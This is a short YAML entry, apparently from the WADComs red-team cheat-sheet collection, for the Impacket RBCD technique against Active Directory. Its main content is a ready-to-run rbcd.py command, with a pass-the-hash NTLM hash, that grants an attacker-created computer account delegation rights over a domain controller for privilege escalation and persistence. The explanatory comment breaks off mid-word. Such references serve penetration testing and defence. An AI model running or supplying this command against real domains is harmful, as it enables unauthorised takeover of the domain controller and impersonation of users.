id: wadcoms/impacket-rbcd
type: technique
platform: active-directory
name: Impacket RBCD
phases:
- execution
- privilege-escalation
- persistence
capabilities:
- command-execution
- privilege-escalation
- persistence
privilege_required: domain-user
sources:
- project: WADComs
  upstream_url: https://wadcoms.github.io
  license: GPL-3.0
  upstream_version: a864cd1
  last_synced: '2026-08-25'
preconditions:
- a valid username
- an NTLM hash (pass-the-hash)
commands:
- template: python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1
    -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
  comment: Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target
    computer with security descriptor of another computer. The following command adds the related security
    descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIden
references:
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py
- https://github.com/tothi/rbcd-attack
tags:
- active-directory
- wadcoms
- kerberos
- smb
- ldap
